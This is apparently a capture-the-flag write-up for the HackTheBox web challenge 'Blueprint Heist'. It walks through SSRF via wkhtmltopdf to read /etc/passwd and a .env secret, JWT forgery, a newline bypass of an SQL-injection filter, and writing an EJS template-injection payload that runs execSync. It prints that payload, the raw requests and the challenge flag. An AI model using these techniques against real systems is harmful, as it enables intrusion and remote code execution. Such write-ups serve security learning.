# Blueprint Heist

### ===== Challenge =====
- Amidst the chaos of their digital onslaught, they manage to extract the blueprints by inflitrating the ministry of internal affair's urban planning commission office detailing the rock and soil layout crucial for their underground tunnel schematics.

### ===== Analysis =====

- I am presented with this page:

![](./Blueprint_page.png)

- By pressing a button, I download a PDF file by issuing this request:

``` http
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTc2Mzk5MDQ1MX0.JQf2XSkp1GaBm04vQz0QcjZvqnw4KXrwXrC1SbxP8P4 HTTP/1.1
Host: 83.136.248.107:57251
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://83.136.248.107:57251/
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 70
Origin: http://83.136.248.107:57251
Connection: keep-alive
Priority: u=0

url=http%3A%2F%2F83.136.248.107%3A57251%2Freport%2Fenviromental-impact
```

- The server fetches a resource from the URL provided and generates a PDF from it. Let's take a look at the source code:

```js
async function generatePdfFromUrl(url, pdfPath) {
    return new Promise((resolve, reject) => {
        wkhtmltopdf(url, { output: pdfPath }, (err) => {
            if (err) {
                console.log(err)
                reject(err);
            } else {
                resolve();
            }
        });
    });
}
```

- It's using **wkhtmltopdf** so I immediately start looking for vulnerabilities and find this:

![](./Blueprint_pdf_vuln.png)
https://exploit-notes.hdks.org/exploit/web/wkhtmltopdf-ssrf/

- So I host the payload (ola2.html) on my server and make the request:

```http
POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTc2MzkyOTU5OH0.DaG2UmWW_ajcvlR13W0qeXKMkzDxZHhWpZMFLG0yLZM HTTP/1.1
Host: 94.237.49.209:54788
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.209:54788/
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 65
Origin: http://94.237.49.209:54788
Connection: keep-alive
Priority: u=4

url=http%3A%2F%2F<REDACTED_HOST>%3A<REDACTED_PORT>%2Fola2.php?x%3d/etc/passwd
```
![](./Blueprint_passwd.png)

- There's a .env in the source code that contains the secret used to sign the JWT tokens and the database credentials. I assumed the ones in the server would be different than the ones provided, so I read the .env next:

![](./Blueprint_env.png)

- They are the same :| Meaning I could've just skipped this step.
- On top of the token, to access the admin page the request needs to come from 127.0.0.1:

```js
const authMiddleware = (requiredRole) => {
    return (req, res, next) => {
        const token = req.query.token;

        if (!token) {
            return next(generateError(401, "Access denied. Token is required."));
        }

        const role = verifyToken(token);

        if (!role) {
            return next(generateError(401, "Invalid or expired token."));
        }

        if (requiredRole === "admin" && role !== "admin") {
            return next(generateError(401, "Unauthorized."));
        } else if (requiredRole === "admin" && role === "admin") {
           if (!checkInternal(req)) {
               return next(generateError(403, "Only available for internal users!"));
            }
        }

        next();
    };
};
```


- So I will generate a token, change its role to admin, sign it with the secret, and host a payload with an iframe on my server pointing to `http://127.0.0.1:1337/admin?token=<ADMIN_TOKEN>`, allowing me to force a **Server-Side Request**

![](./Blueprint_create_key.png)
![](./Blueprint_sign.png)
![](./Blueprint_iframe.png)
![](./Blueprint_admin_pdf.png)

- It doesn't have anything interesting. However, it calls a `/graphql` endpoint to search for users:

```js
    getDataByName: {
      type: new GraphQLList(UserType),
      args: {
        name: { type: GraphQLString }
      },
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        console.log(args.name)
        if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows => rows[0]);
        } catch (error) {
            return generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    }
  }
});
```
- It's vulnerable to **SQL Injecion**, however there's a filter:

```js
function detectSqli (query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
    let result = pattern.test(query)
    console.log()
    return result
}
```
- It can be bypassed by introducing a newline in the beginning:

![](./Blueprint_regex.png)

- The `/graphql` endpoint accepts GET requests, meaning we could pass the malicious query in the URL parameters and use it in our SSRF

```js
router.all("/graphql", authMiddleware("admin"), (req, res, next) => {
    createHandler({ schema, context: { pool } })(req, res, next); 
});
```

- Now was the toughest part for me... I didn't know what to do with the SQL Injection. I tried reading `/root/flag.txt` but didn't have permission. When almost all hope was lost, I came across this:

![](./Blueprint_errors.png)

- This app is using the **EJS template engine**, and when an error occurs it serves the user with `{error_status}.ejs`
- I can use the SQL Injection to write a **SSTI (Server-Side Template Injection)** payload to `404.ejs`, then try to access a resource that doen't exist and see my malicious file.

![](./Blueprint_table.png)
https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti#other-nodejs

- So I start testing in my local docker container, and after a few (a lot of) failed tries, I manage to get a working payload:

`<%- global.process.mainModule.require('child_process').execSync('/readflag').toString() %>`

![](./Blueprint_echo.png)
![](./Blueprint_fake_flag.png)

- The Plan:
    - Pass the `http://localhost:1337/graphql?token=<ADMIN_TOKEN>&query=<SQL INJECTION THAT WRITES SSTI PAYLOAD TO 404.EJS>` (there's no need to put it in an iframe, I was being dumb) in the `url` parameter of `/download`
    - This will write to the `404.ejs` file, which will be served to me when I request a random file

### ===== Exploitation =====
- After a bit of tweaking I manage to get the SQL Injection query working, and it is accepted by the server:

![](./Blueprint_sqli.png)

- Then, when I access a random resource:

![](./Blueprint_flag.png)

- **Flag: HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_w0w!}**

writeup by *varanda* - 24/11/2025








